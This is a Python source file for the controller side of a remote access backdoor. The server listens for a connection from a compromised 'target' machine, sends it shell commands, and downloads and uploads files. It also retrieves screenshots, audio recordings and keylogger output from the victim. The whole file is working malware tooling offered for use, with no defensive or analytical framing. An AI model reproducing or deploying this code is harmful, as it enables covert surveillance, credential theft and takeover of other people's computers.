# Enhanced Python Backdoor Server
# Supports: Command shell, file transfer, keylogger, screenshot, audio

import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        try:
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        target.settimeout(None)

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command == 'screenshot':
            download_file('screen.png')
            print("[+] Screenshot saved as screen.png")
        elif command == 'record_audio':
            print(reliable_recv())  # Acknowledge
            download_file('recording.wav')
            print("[+] Audio saved as recording.wav")
        elif command == 'keylog_dump':
            result = reliable_recv()
            print("\n[+] Keylogger Output:\n" + result + "\n")
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.56.103', 5555))  # Change to your listener IP
print('[+] Listening For Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
